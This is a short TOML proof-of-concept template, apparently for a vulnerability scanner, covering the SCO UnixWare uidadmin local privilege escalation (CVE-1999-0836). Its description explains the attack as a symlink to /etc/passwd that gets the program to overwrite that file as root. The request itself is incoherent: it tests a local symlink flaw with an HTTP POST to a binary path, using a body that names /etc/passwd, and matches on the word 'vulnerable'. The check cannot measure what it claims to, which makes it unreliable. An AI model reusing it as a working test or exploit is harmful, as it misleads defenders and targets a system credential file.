[info]
author = "ave"
description = "验证 SCO UnixWare 系统中的 uidadmin 程序存在本地权限提升漏洞。该程序在运行时会以 root 权限处理用户可控的文件路径，攻击者可通过创建指向敏感系统文件（如 /etc/passwd）的符号链接，诱使 uidadmin 以 root 身份写入或覆盖目标文件，从而获得 root 权限。"
id = "POC-AVE-1999-1182"
name = "SCO UnixWare uidadmin 本地权限提升漏洞 PoC"
severity = "high"
tags = ["ave-1999-1182"]
vuln_id = [
    "CVE-1999-0836",
    "AVE-1999-1182",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/usr/sbin/uidadmin"
protocol = "http"

[poc.requests.body]
content = "file=/etc/passwd&link=/etc/passwd"
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["vulnerable"]
